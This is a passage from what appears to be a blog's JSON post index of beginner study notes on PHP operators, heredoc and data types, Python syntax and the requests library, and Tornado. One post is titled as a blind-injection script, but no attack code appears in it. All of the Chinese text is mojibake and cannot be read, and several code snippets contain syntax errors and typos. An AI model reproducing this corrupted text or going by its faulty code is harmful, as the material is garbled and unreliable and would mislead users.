20;echo $b=19?&quot;yes&quot;:&quot;no&quot;;?&gt; è¾“å‡ºç»“æœæ˜¯noè½¬æ¢æˆifè¯­å¥å°±æ˜¯ 1234ifï¼ˆ$b==20ï¼‰{echo &quot;yes&quot;;}else{echo&quot;no&quot;;} ä¸‰å…ƒè¿ç®—ç¬¦çš„æœ‰ç‚¹ä¹‹å¤„åœ¨äºä»–å¾ˆç®€ç»ƒï¼Œè¿˜æœ‰æ›´å¼ºå¤§çš„åº”ç”¨ï¼Œè¿™é‡Œæ”¾ä¸ªé“¾æ¥https://www.php.cn/php-weizijiaocheng-383293.htmlä¸¾ä¸ªèœé¸Ÿæ•™ç¨‹çš„ä¾‹å­ 12345678910&lt;?php$test = 'èœé¸Ÿæ•™ç¨‹';// æ™®é€šå†™æ³•$username = isset($test) ? $test : 'nobody';echo $username, PHP_EOL;// PHP 5.3+ ç‰ˆæœ¬å†™æ³•$username = $test ?: 'nobody';echo $username, PHP_EOL;//PHP_EOLçš„æ„æ€æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦?&gt; åœ¨è¿™ä¸ªä»£ç é‡Œé¢è¾“å‡ºçš„éƒ½æ˜¯èœé¸Ÿæ•™ç¨‹ ä»Šå¤©å…ˆåˆ°è¿™é‡Œå§ã€‚å“ˆå“ˆå“ˆå“ˆå“ˆ è¡¥å……ä¸€ä¸‹ç»„åˆæ¯”è¾ƒç¬¦ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦ï¼šå¯ä»¥è½»æ¾å®ç°ä¸¤ä¸ªå˜é‡çš„æ¯”è¾ƒï¼Œå½“å•Šç„¶ä¸ä»…é™äºæ•°å€¼ç±»æ•°æ®çš„æ¯”è¾ƒç¬¦å·æ˜¯:&lt;=&gt;è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š$c=$a&lt;=&gt;$b;è§£æä¸€ä¸‹è§£æå¦‚ä¸‹ï¼š å¦‚æœ $a &gt; $b, åˆ™ $c çš„å€¼ä¸º 1ã€‚ å¦‚æœ $a == $b, åˆ™ $c çš„å€¼ä¸º 0ã€‚ å¦‚æœ $a &lt; $b, åˆ™ $c çš„å€¼ä¸º -1ã€‚å®ä¾‹ 12345678910111213141516&lt;?php// æ•´å‹echo 1 &lt;=&gt; 1; // 0echo 1 &lt;=&gt; 2; // -1echo 2 &lt;=&gt; 1; // 1// æµ®ç‚¹å‹echo 1.5 &lt;=&gt; 1.5; // 0echo 1.5 &lt;=&gt; 2.5; // -1echo 2.5 &lt;=&gt; 1.5; // 1// å­—ç¬¦ä¸²echo &quot;a&quot; &lt;=&gt; &quot;a&quot;; // 0echo &quot;a&quot; &lt;=&gt; &quot;b&quot;; // -1echo &quot;b&quot; &lt;=&gt; &quot;a&quot;; // 1?&gt;","link":"/2020/10/09/php%E8%BF%90%E7%AE%97%E7%AC%A6-%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"title":"postPHP efo&amp;æ•°æ®ç±»å‹","text":"EOFæŒ‡ä»¤echo &lt;&lt;&lt;EOF//è¦è¾“å‡ºçš„å­—ç¬¦EFO; éœ€è¦æ³¨æ„çš„ç‚¹æœ‰1.EOFå…¶å®å¯ä»¥ç”¨å…¶ä»–å­—æ¯æ¥è¡¨ç¤º2.ç»“å°¾å¿…é¡»è¦æœ‰åˆ†å·3 ç»“æŸæ ‡è¯†å¿…é¡»é¡¶æ ¼ç‹¬è‡ªå ä¸€è¡Œ(å³å¿…é¡»ä»è¡Œé¦–å¼€å§‹ï¼Œå‰åä¸èƒ½è¡”æ¥ä»»ä½•ç©ºç™½å’Œå­—ç¬¦)ã€‚æ¥ä¸‹æ¥æ©é¥°ä¸€æ®µ 123456789&lt;?php$name=&quot;runoob&quot;;$a= *&lt;&lt;&lt;EOF &quot;abc&quot;$name &quot;123&quot;EOF*;*// ç»“æŸéœ€è¦ç‹¬ç«‹ä¸€è¡Œä¸”å‰åä¸èƒ½ç©ºæ ¼*echo $a;?&gt; è¾“å‡ºç»“æœæ˜¯ â€œabcâ€ronoob â€œ123â€ æ•°æ®ç±»å‹å­—ç¬¦ä¸²åœ¨PHPä¸­ï¼Œå…¶å®â€â€å’Œâ€™â€™é‡Œé¢éƒ½æ˜¯å¯ä»¥åŠ è¦è¾“å‡ºçš„æ–‡æœ¬çš„ï¼Œå’ŒCæœ‰äº›ä¸ä¸€æ · æ•´å‹ï¼Œæµ®ç‚¹å‹ï¼Œå¸ƒå°”å‹ï¼Œæ•°ç»„ï¼Œå¯¹è±¡è¿™é‡Œè¦å…ˆå¼•å…¥ä¸€ä¸ªå‡½æ•°var_dump($å˜é‡å­—ç¬¦)ï¼Œä»–æ˜¯å¯ä»¥ç”¨æ¥è¿”å›å˜é‡çš„æ•°æ®ç±»å‹å’Œå€¼ï¼ˆè¿™å¥è¯æ²¡æœ‰å¾ˆç†è§£ï¼Œè¿”å›å€¼çš„æ„æ€æ˜¯æˆ‘å‘å‡ºä¸€ä¸ªå€¼ï¼Œé€šè¿‡è¿™ä¸ªå‡½æ•°ï¼Œè¿”å›æ¥äº†å¦ä¸€ä¸ªå€¼ï¼Ÿä½†æ˜¯åé¢åˆè¯´æ²¡æœ‰è¿”å›å€¼ï¼Ÿï¼Ÿï¼‰ 1234567891011&lt;?PHP$a = &quot;alsdflasdf;a&quot;;$b = var_dump($a);echo &quot;&lt;br&gt;&quot;;//var_dump($c);$d=var_dump($c);echo &quot;&lt;br&gt;&quot;;//è¾“å‡ºä¸€ä¸ªæ¢è¡Œç¬¦çš„æ„æ€echo $a;echo &quot;&lt;br&gt;&quot;;//åŒç†echo $b;echo &quot;&lt;br&gt;&quot;; è¾“å‡ºçš„å€¼ä¸º 12345string(12) &quot;alsdflasdf;a&quot;//è¿™è¾¹çš„stringï¼ˆ12ï¼‰çš„æ„æ€æ˜¯è¾“å‡ºçš„ç¬¬ä¸€ä¸ªå…ƒç´ ç±»å‹é•¿åº¦ä¸º12NULLalsdflasdf;a è¿™é‡Œåˆ†æä¸€ä¸‹è¿™ä¸ªvar_dumpå§ï¼Œä»ä¸Šé¢è¿™ä¸ªä»£ç åˆ†æå¯ä»¥çœ‹å‡ºè¯¥å‡½æ•°å’Œechoçš„è¾“å‡ºç±»å‹ä¸å¤ªä¸€æ · åœ¨phpä¸‹:echo è¾“å‡ºçš„æ˜¯å˜é‡å’Œå­—ç¬¦ä¸²; var_dump è¾“å‡ºçš„æ˜¯å˜é‡ç±»å‹,å˜é‡é•¿åº¦å’Œå˜é‡å€¼,è¾“å‡ºçš„ä¼šæ›´è¯¦ç»†; æ¥ä¸‹æ¥æ˜¯æ•´å‹å˜é‡ æ„Ÿè§‰å’ŒCçš„æ²¡å¤šå¤§å·®åˆ«ï¼Œå°±ä¸ç€é‡è®²äº†ï¼Œä»¥åé‡åˆ°ç‰¹åˆ«çš„æ²¡æƒ³åˆ°çš„å†æ¥è¡¥å…… æµ®ç‚¹å‹åŒç†æ•´å‹å¸ƒå°”å‹æ„Ÿè§‰ä¸æ˜¯å¾ˆæ‡‚https://www.cnblogs.com/xielong/p/9874955.htmlå…ˆè®°å½•ç½‘å€ï¼Œä»¥åé‡åˆ°å…·ä½“é—®é¢˜çš„å†æ¥å›é¡¾æ•°ç»„æ•°ç»„:å¯ä»¥åœ¨ä¸€ä¸ªå˜é‡ä¸­å­˜å‚¨å¤šä¸ªå€¼ 1234&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt; å¯ä»¥è¾“å‡º 12345678array(3) { [0]=&gt; string(5) &quot;Volvo&quot; [1]=&gt; string(3) &quot;BMW&quot; [2]=&gt; string(6) &quot;Toyota&quot;} å°±å¯ä»¥æŠŠæ•°ç»„å†…å®¹å®Œå…¨è¾“å‡ºå‡ºæ¥ï¼Œä½†æ˜¯ä½ ç”¨echoå°±åªèƒ½è¾“å‡ºarrayï¼Ÿè¿˜æ˜¯æŒºç¥å¥‡çš„ã€‚PHPå¯¹è±¡é¦–å…ˆéœ€è¦ç”¨classå…³é”®å­—å£°æ˜ç±»å¯¹è±¡è¿™ä¸ªæ ¼å¼æ˜¯è¿™æ ·çš„ 12345678910111213&lt;?phpclass Person//ç±»å{ //æ‹¬å·é‡Œå†™ç±»çš„å®šä¹‰ public $age; //å±æ€§å¯¹åº”çš„æ˜¯å˜é‡ public function eat () //è¡Œä¸ºå¯¹åº”çš„æ˜¯æ–¹æ³• { echo 'æˆ‘åœ¨åƒé¥­'; }}$xiaoming = new Person();//å°æ‹¬å·å¯åŠ å¯ä¸åŠ ï¼Œæ¨èéƒ½åŠ var_dump($xiaoming- &gt;age = 18)ï¼›//é€šè¿‡å¯¹è±¡æ¥è®¿é—®è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•æ·»åŠ -&gt;(ä½ è¦è®¿é—®çš„å±æ€§å’Œæ–¹æ³•çš„å­—ç¬¦)ï¼Œå‰é¢æ— $ï¼Œç„¶åè¿™ä¸ªageä¹Ÿå¯ä»¥åœ¨ä¸Šé¢å†™ä¸€è¡Œ$xiaoming- &gt;age = 18;ï¼Œç„¶åä¸‹é¢å†™var_dump($xiaoming-&gt;age);$xiaoming-&gt;eat()ï¼›//è¿™æ ·å°±å¯ä»¥è®¿é—®è‡ªå·±çš„æ–¹æ³•ï¼Œåé¢æœ‰æ‹¬å· åˆ›å»ºå¯¹è±¡çš„ç¬¬äºŒä¸ªæ–¹æ³• $name = â€˜personâ€™; $xiaoming = new $name(); å‘½åè§„èŒƒ ç±»åéµä»å¤§é©¼å³°åŸåˆ™ï¼š persontest====&gt;PersonTest(æ¯ä¸ªå•è¯çš„é¦–å­—æ¯è¦å¤§å†™)è¿™é‡Œæ‰é™ˆè¿°ä¸€ä¸‹åˆ›å»ºå¯¹è±¡çš„æ„ä¹‰å§ï¼šåˆ›å»ºå®Œå¯¹è±¡çš„ç±»åˆ«ï¼Œå¹¶ä¸”å®šä¹‰å¥½ä»–çš„å±æ€§ï¼Œä¸‹æ¬¡åœ¨è¿ç”¨æ—¶ï¼Œä½ åªè¦$(æƒ³è¦èµ‹å€¼çš„å˜é‡)=new ï¼ˆä½ å®šä¹‰çš„ç±»ï¼‰ï¼ˆï¼‰è¿™æ ·ä½ æƒ³è¦èµ‹å€¼çš„å˜é‡å°±å¯ä»¥æ‹¥æœ‰ç±»åˆ«çš„å±æ€§ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ç»†æ“å±æ€§çš„å€¼ã€‚ åç»­å¦‚æœéœ€è¦ç»§ç»­å­¦ä¹ å¯¹è±¡ç›¸å…³çŸ¥è¯†ï¼Œå†æ¥è¡¥å……æ¥ä¸‹æ¥æ˜¯PHP NULLå€¼ å°±æ˜¯è¡¨ç¤ºä¸€ä¸ªå˜é‡ä¸ºç©ºå€¼ï¼Œå¯ä»¥ç›´æ¥è®¾ç½®NULLæ¥æ¸…ç©ºä¸€ä¸ªå˜é‡çš„å€¼ä¾‹ï¼š 12345&lt;?php$x='hello world';$x=null;var_dump($x);?&gt; è¿™ä¸ªæ¯”è¾ƒç®€å•å°±ä¸è¿‡å¤šé™ˆè¿°äº† ä»Šå¤©å…ˆåˆ°è¿™é‡Œäº†ï¼Œä¸‹æ¬¡å†æ¥ç»§ç»­","link":"/2020/10/08/postPHP-efo-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"},{"title":"Pythonç¼–å†™ç›²æ³¨è„šæœ¬","text":"PythonåŸºæœ¬è¯­æ³•ï¼š æ¡ä»¶åˆ¤æ–­è¯­å¥if True: print(&quot;True&quot;) print(&quot;ansewe&quot;)//åŒä¸€ä¸ªå±‚æ¬¡çš„ä»£ç ç¼©è¿›è¦ä¸€è‡´ï¼Œpythonè¯­è¨€ç”¨åŒç¼©è¿›çš„å¤šå°‘è¡¨ç¤ºæ˜¯å¦ä¸ºåŒä¸€å±‚æ¬¡ï¼Œæ˜¯å¦ä¸ºä¸€ä¸ªä»£ç æ®µelse: print(&quot;False&quot;) score = 87if score &gt;=90 and score &lt;=100: print(&quot;A&quot;)elif score &gt;=80 and &lt;90: print(&quot;B&quot;) å¼•å…¥åº“ï¼ˆéšæœºæ•°ï¼‰import randomx = random.randint(0,2) #éšæœºç”Ÿæˆ0 1 2print(&quot;%d&quot;%x) x=input(è¯·è¾“å…¥æ•°å­—)y=random.randint(0,2)if x=y: print(ä½ ä»¬å‡ºçš„ä¸€æ ·)elif x=0 and y=1 : print(&quot;æˆ‘å‡ºçš„æ˜¯å‰ªåˆ€ï¼Œä½ è¾“å•¦&quot;) forå¾ªç¯forå®Œæœ‰ä¸€ä¸ªå†’å·è®°å¾—å¡«å†™ for i in range(5)://å¾ªç¯ä»0å¼€å§‹ä¸€å…±äº”æ¬¡ print(i) for i in range (0,10,3)//å¾ªç¯ä»0å¼€å§‹ä¸€ç›´åˆ°10 æ¯æ¬¡å¢åŠ 3æ¬¡print(i) for i in range (-10,-100,-30)//å¾ªç¯ä»-10å¼€å§‹ä¸€ç›´åˆ°-100 æ¯æ¬¡å‡å°‘30æ¬¡print(i) å¯¹äºå­—ç¬¦ name=&quot;chengdu&quot; for x in name: print(x)//é’ˆå¯¹å­—ç¬¦ï¼Œè¾“å‡ºçš„æ˜¯chengduï¼ˆæœ‰æ¢è¡Œï¼‰ï¼Œä¸æ¢è¡ŒåŠ ä¸€ä¸ª,end='' a=[&quot;aa&quot;,&quot;bb&quot;,&quot;cc&quot;,&quot;dd&quot;]for i in range(len(a))print(i,a[i])// è¿™é‡Œçš„lenæŒ‡çš„æ˜¯è¾“å‡ºaå½“ä¸­å…ƒç´ çš„ä¸ªæ•°ï¼Œä¸ºå››ä¸ªæ‰€ä»¥å¾ªç¯ä¸º0-4ï¼Œç„¶åæ‰“å°å‡ºæ¥ whileå¾ªç¯i=0while i&lt;5: print(&quot;å½“å‰æ˜¯ç¬¬%dæ¬¡æ‰§è¡Œå¾ªç¯&quot;%(i+1)) print(&quot;i=%d&quot;%i) i +=1 i=0a=0n=100while i&lt;=n: a=a+i i+=1print(&quot;1-%dçš„å’Œ=%d&quot;%(n,a)//1-100æ±‚å’Œ count=0while cout&lt;5: print(count,&quot;å°äº5&quot;) count +=1else: print(count,&quot;å¤§äºæˆ–ç­‰äº5&quot;)//ä¸æ­¢æ˜¯ifå¯ä»¥åŠ else whileä¹Ÿå¯ä»¥//è¾“å‡ºç»“æœï¼š0 å°äº51 å°äº52 å°äº53 å°äº54 å°äº55 å¤§äºæˆ–ç­‰äº5 break/continue/passbreakï¼šç»ˆæ­¢å¾ªç¯continueï¼šæœ¬æ¬¡å¾ªç¯ç»ˆæ­¢passï¼šçº¯å±å ä½ å­—ç¬¦ä¸²word='this'sentence=&quot;this is a word&quot;paragraphy=''' this is a paragarphy å¯ä»¥æ¢è¡Œ'''print(word)print(sentence)print(paragraphy)//éœ€è¦è½¬ä¹‰ çš„å­—ç¬¦ \\\\ \\' \\&quot; å­—ç¬¦ä¸²å‡½æ•°strstr=&quot;chengdu&quot;print(str[0:6:2])// str[èµ·å§‹ä½ç½®:ç»“æŸä½ç½®:æ­¥è¿›å€¼(å¯é€‰ï¼Œé»˜è®¤ä¸º1)] å­—ç¬¦ä¸²ç›¸è¿æ¥str=&quot;chengdu&quot;print(str+&quot;,ä½ å¥½&quot;)//æ‰“å°chengduï¼Œä½ å¥½print(str*3)//æ‰“å°ä¸‰æ¬¡print(r&quot;hello\\nchengdu&quot;)//å‰é¢æœ‰r é‡Œé¢çš„å†…å®¹ä¼šåŸæ ·è¾“å‡º æ¯”å¦‚\\nå°±ä¸ä¼šè½¬ä¹‰ å­—ç¬¦ä¸²çš„å¸¸è§æ“ä½œ1.bytes.decode(encoding=â€utf-8â€, errors=â€strictâ€Python3 ä¸­æ²¡æœ‰ decode æ–¹æ³•ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ bytes å¯¹è±¡çš„ decode() æ–¹æ³•æ¥è§£ç ç»™å®šçš„ bytes å¯¹è±¡ï¼Œè¿™ä¸ª bytes å¯¹è±¡å¯ä»¥ç”± str.encode() æ¥ç¼–ç è¿”å›ã€‚2.encode(encoding=â€™UTF-8â€™,errors=â€™strictâ€™ä»¥ encoding æŒ‡å®šçš„ç¼–ç æ ¼å¼ç¼–ç å­—ç¬¦ä¸²ï¼Œå¦‚æœå‡ºé”™é»˜è®¤æŠ¥ä¸€ä¸ªValueError çš„å¼‚å¸¸ï¼Œé™¤é errors æŒ‡å®šçš„æ˜¯â€™ignoreâ€™æˆ–è€…â€™replaceâ€™3.isalnum()å¦‚æœå­—ç¬¦ä¸²è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦å¹¶ä¸”æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å­—æ¯æˆ–æ•°å­—åˆ™è¿” å› Trueï¼Œå¦åˆ™è¿”å› False4.isalpha()å¦‚æœå­—ç¬¦ä¸²è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦å¹¶ä¸”æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å­—æ¯æˆ–ä¸­æ–‡å­—åˆ™è¿”å› True, å¦åˆ™è¿”å› False5.isdigit()å¦‚æœå­—ç¬¦ä¸²åªåŒ…å«æ•°å­—åˆ™è¿”å› True å¦åˆ™è¿”å› False6.isnumeric()å¦‚æœå­—ç¬¦ä¸²ä¸­åªåŒ…å«æ•°å­—å­—ç¬¦ï¼Œåˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› False7.join(seq)ä»¥æŒ‡å®šå­—ç¬¦ä¸²ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå°† seq ä¸­æ‰€æœ‰çš„å…ƒç´ (çš„å­—ç¬¦ä¸²è¡¨ç¤º)åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²8.len(string)è¿”å›å­—ç¬¦ä¸²é•¿åº¦9.istrip()æˆªæ‰å­—ç¬¦ä¸²å·¦è¾¹çš„ç©ºæ ¼æˆ–æŒ‡å®šå­—ç¬¦10rstrip()åˆ é™¤å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼11split(str=â€â€, num=string.count(str))ä»¥ str ä¸ºåˆ†éš”ç¬¦æˆªå–å­—ç¬¦ä¸²ï¼Œå¦‚æœ num æœ‰æŒ‡å®šå€¼ï¼Œåˆ™ä»…æˆªå– num+1 ä¸ªå­å­—ç¬¦ä¸² åˆ—è¡¨å®šä¹‰+å¢åŠ namelist=[1,'huang',3]//å®šä¹‰ä¸€ä¸ªåˆ—è¡¨for name in namelist: print(name) //éå†è¾“å‡ºnamelist //ä½¿ç”¨whileéå†è¾“å‡ºæ•°ç»„length=len(namelist)i=0while i&lt;length: print(namelist[i]) i+=1//appendåœ¨æ•°å­—æœ«å°¾å¢åŠ ä¸€ä¸ªå€¼//eg1.nametemp=input(&quot;è¯·è¾“å…¥æ•°å­—:&quot;)namelist.append(nametemp)for num in namelist: print(num) eg2.a=[1,2]b=[3,4]a.append(b)// å°†åˆ—è¡¨å½“åšä¸€ä¸ªå…ƒç´ åŠ å…¥åˆ°aåˆ—è¡¨ä¸­//ç»“æœæ˜¯ [1,2,[3,4]]extend(b)print(a)//ç»“æœæ˜¯[1,2,3,4]//insertï¼šæŒ‡å®šä¸‹æ ‡ä½ç½®æ’å…¥å…ƒç´ a=[0,1,2]a.insert(1,3) #ç¬¬ä¸€ä¸ªå˜é‡è¡¨ç¤ºå°æ ‡ï¼Œç¬¬äºŒä¸ªå˜é‡è¡¨ç¤ºå…ƒç´ ï¼ˆå¯¹è±¡ï¼‰print(a) åˆ é™¤//del åœ¨æŒ‡å®šä½ç½®åˆ é™¤ä¸€ä¸ªå…ƒç´ a=[0,1,2]del a[2]for i in a: print(i)//pop() å¼¹å‡ºæœ«å°¾æœ€åä¸€ä¸ªå…ƒç´ a.pop()//remove ç›´æ¥åˆ é™¤æŒ‡å®šå†…å®¹çš„å…ƒç´ a.remove(1)//å¦‚æœæœ‰é‡å¤çš„æ•°æ®æ¯”å¦‚[0,1,1,2]åªåˆ é™¤æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ª æ›´æ”¹a=[1,1,1]a[1]=2//ç›´æ¥æ”¹å°±è¡Œ æŸ¥æ‰¾//ä½¿ç”¨æ¡ä»¶åˆ¤æ–­è¯­å¥findnumeber=input(&quot;è¯·è¾“å…¥ä½ è¦æŸ¥æ‰¾çš„æ•°å­—&quot;)if findnumber in a: print(&quot;åœ¨&quot;)else: print(&quot;ä¸åœ¨&quot;)//ä½¿ç”¨indexå‡½æ•°a=[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;a&quot;,&quot;b&quot;]print(a.index(&quot;a&quot;,1,4))//æŸ¥æ‰¾aè¿™ä¸ªå…ƒç´ åœ¨ä¸‹æ ‡1-4éƒ½å‡ºç°åœ¨å“ªé‡Œ ç»“æœè¿”å›çš„æ˜¯æ•°ç»„ä¸‹æ ‡ï¼Œå¹¶ä¸”èŒƒå›´æ˜¯å·¦é—­å³å¼€çš„//ä½¿ç”¨countè®¡æ•°æŸä¸ªå…ƒç´ å‡ºç°å‡ æ¬¡print(mylist.count(&quot;c&quot;)) æ‹“å±•://æ’åºå’Œåè½¬a=[1,4,3,2,5]a.reverse() //å°†åˆ—è¡¨æ‰€æœ‰å…ƒç´ åè½¬a.sort() //å‡åºæ’åºa.sort(reverse=Ture)//é™åºæ’åº //ç±»äºŒä½æ•°ç»„:a=[[1,2],[3,4],[5,6]]print(a[0])//è¾“å‡º[1,2]print(a[0][0])//è¾“å‡º[1] ä¸‰ä¸ªåŠå…¬å®¤ï¼Œå…«ä¸ªè€å¸ˆï¼Œéšæœºåˆ†é…åˆ°ä¸‰ä¸ªåŠå…¬å®¤å¹¶å°†å…¶æ‰“å° import randomoffices=[[],[],[]]names=[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;]for name in names: index = random.randint(0,2) offices[index].append(name)i=1for office in offices: print(&quot;%d:%d&quot;%(i,len(office))) i+=1 for name in office: print(&quot;%s&quot;%name,end=&quot;\\t&quot;) print(&quot;\\n&quot;) print(&quot;-&quot;*20) å…ƒç»„tup1=() //åˆ›å»ºä¸€ä¸ªç©ºçš„å…ƒç»„tup2=(50)//æ­¤æ—¶ä¸æ˜¯å…ƒç»„ typeä¸ºinttup3=(50,)//åŠ ä¸€ä¸ªé€—å·æ‰èƒ½è¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªå…ƒç»„ å‡½æ•°//def:å®šä¹‰å‡½æ•° Requestsåº“å­¦ä¹ å¯¼å…¥requestsæ¨¡å— import requests ç„¶åï¼Œå°è¯•è·å–æŸä¸ªé¡µé¢ r = requests.get('url')//getè¯·æ±‚r = requests.post('url'ï¼Œdata={'key'='value'})//postè¯·æ±‚ å…¶ä»–HTTPè¯·æ±‚ç±»å‹ä¹Ÿæ˜¯å¦‚æ­¤ ä¼ é€’URLå‚æ•°åœ¨urlä¸­ä¼ é€’æ•°æ®ï¼š Requests å…è®¸ä½ ä½¿ç”¨ params å…³é”®å­—å‚æ•°ï¼Œä»¥ä¸€ä¸ªå­—ç¬¦ä¸²å­—å…¸æ¥æä¾›è¿™äº›å‚æ•°ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ æƒ³ä¼ é€’ key1=value1 å’Œ key2=value2 åˆ° httpbin.org/get ï¼Œé‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š payload = {'key1':'value1','key2':'value2'}r = requests.get(&quot;http://httpbin.org/get&quot;,params=payload) è¿”å›è¾“å‡ºç»“æœ print(r.url)//http://httpbin.org/get?key2=value2&amp;key1=value1 **ps:**å­—å…¸é‡Œçš„noneå€¼å¾—é”®ä¸ä¼šè¢«æ·»åŠ åˆ°URLçš„æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ å“åº”å†…å®¹è¯»å–æœåŠ¡å™¨å“åº”çš„å†…å®¹ï¼šimport requestsr = requests.get('URL')r.textprint(r.text) ä¼šè¯å¯¹è±¡:ä¼šè¯å¯¹è±¡è®©ä½ èƒ½å¤Ÿè·¨è¯·æ±‚ä¿æŒæŸäº›å‚æ•°ã€‚å®ƒä¹Ÿä¼šåœ¨åŒä¸€ä¸ªsessionå®ä¾‹å‘å‡ºçš„æ‰€æœ‰è¯·æ±‚ä¹‹é—´ä¿æŒcookieã€‚ è·¨è¯·æ±‚ä¿æŒä¸€äº›cookies = requests.Session()r = s.get(&quot;http://httpbin.org/cookies&quot;)print(r.text)# '{&quot;cookies&quot;: {&quot;sessioncookie&quot;: &quot;123456789&quot;}}' å‚è€ƒæ–‡ç« :https://2.python-requests.org/zh_CN/latest/user/quickstart.htmlhttps://2.python-requests.org/zh_CN/latest/user/advanced.html#advanced pythonç‰ˆæœ¬æ›´æ¢æŒ‡ä»¤py -2.7py -3 1ã€å­—ç¬¦ä¸²å‰åŠ  få­—ç¬¦ä¸²æ ¼å¼åŒ–ï¼ˆpython 3.6 æ–°å¢ï¼Œç±»ä¼¼äºperlä¸­çš„å˜é‡å†…æ’ï¼‰ ä¾‹ï¼š vers = â€˜python 3.6â€™ fâ€è¯¥åŠŸèƒ½æ˜¯{vers}æ–°å¢â€ è¿”å›ï¼šè¯¥åŠŸèƒ½æ˜¯python 3.6æ–°å¢ æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²æ–‡å­—å‰ç¼€ä¸ºâ€fâ€ï¼Œç±»ä¼¼str.format()ã€‚åŒ…å«ç”±èŠ±æ‹¬å·åŒ…å›´çš„æ›¿æ¢åŒºåŸŸã€‚æ›¿æ¢å­—æ®µæ˜¯è¡¨è¾¾å¼ï¼Œåœ¨è¿è¡Œæ—¶è¿›è¡Œè¯„ä¼°ï¼Œç„¶åä½¿ç”¨format()åè®®è¿›è¡Œæ ¼å¼åŒ–ã€‚ 2ã€å­—ç¬¦ä¸²å‰åŠ  uä¾‹ï¼šuâ€æˆ‘æ˜¯å«æœ‰ä¸­æ–‡å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚â€ ä½œç”¨ï¼šåé¢å­—ç¬¦ä¸²ä»¥ Unicode æ ¼å¼ è¿›è¡Œç¼–ç ï¼Œä¸€èˆ¬ç”¨åœ¨ä¸­æ–‡å­—ç¬¦ä¸²å‰é¢ï¼Œé˜²æ­¢å› ä¸ºæºç å‚¨å­˜æ ¼å¼é—®é¢˜ï¼Œå¯¼è‡´å†æ¬¡ä½¿ç”¨æ—¶å‡ºç°ä¹±ç ã€‚ 3ã€å­—ç¬¦ä¸²å‰åŠ  rä¾‹ï¼šrâ€\\n\\t\\nâ€ è¿”å›ï¼š\\n\\t\\n ä½œç”¨ï¼šå£°æ˜åé¢çš„å­—ç¬¦ä¸²æ˜¯æ™®é€šå­—ç¬¦ä¸²ï¼Œç›¸å¯¹çš„ï¼Œç‰¹æ®Šå­—ç¬¦ä¸²ä¸­å«æœ‰ï¼šè½¬ä¹‰å­—ç¬¦ \\n \\t ä»€ä¹ˆä»€ä¹ˆçš„ã€‚ 4ã€å­—ç¬¦ä¸²å‰åŠ  bä½œç”¨ï¼špython3.xé‡Œé»˜è®¤çš„stræ˜¯unicodeç±», py2.xçš„stræ˜¯ bytesç±», bâ€œæˆ‘(python 3)çš„stræ˜¯ bytesâ€ ä»£è¡¨çš„å°±æ˜¯bytesç±» ã€‚ python2.xé‡Œ, bå‰ç¼€æ²¡ä»€ä¹ˆå…·ä½“æ„ä¹‰ï¼Œ åªæ˜¯ä¸ºäº†å…¼å®¹python3.xçš„è¿™ç§","link":"/2020/12/24/postPython%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"},{"title":"python Tornadoå­¦ä¹ ","text":"æ˜¯ä»€ä¹ˆï¼ŸTornadoæ˜¯ä½¿ç”¨Pythonç¼–å†™çš„ä¸€ä¸ªå¼ºå¤§çš„ã€å¯æ‰©å±•çš„WebæœåŠ¡å™¨ è¿è¡ŒæœåŠ¡ï¼šçœŸæ­£ä½¿å¾—Tornadoè¿è½¬èµ·æ¥çš„è¯­å¥ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨Tornadoçš„optionsæ¨¡å—æ¥è§£æå‘½ä»¤è¡Œã€‚ç„¶åæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªTornadoçš„Applicationç±»çš„å®ä¾‹ã€‚ä¼ é€’ç»™Applicationç±»__init__æ–¹æ³•çš„æœ€é‡è¦çš„å‚æ•°æ˜¯handlersã€‚å®ƒå‘Šè¯‰Tornadoåº”è¯¥ç”¨å“ªä¸ªç±»æ¥å“åº”è¯·æ±‚ã€‚é©¬ä¸Šæˆ‘ä»¬è®²è§£æ›´å¤šç›¸å…³çŸ¥è¯†ã€‚ 123http_server = tornado.httpserver.HTTPServer(app)http_server.listen(options.port)tornado.ioloop.IOLoop.instance().start() ä»è¿™é‡Œå¼€å§‹çš„ä»£ç å°†ä¼šè¢«åå¤ä½¿ç”¨ï¼šä¸€æ—¦Applicationå¯¹è±¡è¢«åˆ›å»ºï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ä¼ 